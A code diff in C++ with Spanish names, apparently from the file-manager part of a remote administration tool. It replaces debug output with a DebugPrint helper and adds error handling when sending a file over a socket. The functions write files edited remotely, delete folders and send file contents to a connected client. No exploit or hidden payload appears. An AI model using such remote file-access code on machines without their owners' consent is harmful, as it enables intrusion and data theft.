@@ -164,26 +164,18 @@ void BorrarFolder(c_char* cPath) {
 }
 
 void EditarArchivo_Guardar(std::string strPath, c_char* cBuffer, std::streamsize iBufferSize) {
-#ifdef ___DEBUG_
-	std::cout << "[!] Guardando archivo [remote-edit]: " << strPath << std::endl;
-	std::cout << "[!]Buffer:" << std::endl << cBuffer << std::endl;
-#endif
+	DebugPrint("[!] Guardando archivo [remote-edit]: " + strPath);
 	
 	std::ofstream localFile(strPath, std::ios::binary);
 	if (!localFile.is_open()) {
-#ifdef ___DEBUG_
-		error();
-		std::cout << "No se pudo abrir el archivo " << strPath << std::endl;
-#endif
+		DebugPrint("No se pudo abrir el archivo " + strPath);
 		return;
 	}
 
 	localFile.write(cBuffer, iBufferSize);
 
 	size_t iFinal = localFile.tellp();
-#ifdef ___DEBUG_
-	std::cout << "[!] " << iFinal << " escritos" << std::endl;
-#endif	
+	DebugPrint("[!] " + std::to_string(iFinal) + " escritos");
 
 
 	localFile.flush();
@@ -234,12 +226,18 @@ void EnviarArchivo(const std::string& cPath, const std::string& cID) {
 			memcpy(nTempBuffer, strHeader.c_str(), iHeaderSize);
 			memcpy(nTempBuffer + iHeaderSize, cBufferArchivo, iBytesLeidos);
 
-			uBytesEnviados += cCliente->cSend(cCliente->sckSocket, nTempBuffer, iTotal, 0, true);
+			int iEnviado = cCliente->cSend(cCliente->sckSocket, nTempBuffer, iTotal, 0, true);
+			uBytesEnviados += iEnviado;
 			Sleep(20);
 
 			if (nTempBuffer) {
 				delete[] nTempBuffer;
 				nTempBuffer = nullptr;
+			}
+
+			if (iEnviado == -1 || iEnviado == WSAECONNRESET) {
+				//No se pudo enviar el paquete
+				break;
 			}
 		} else {
 			break;
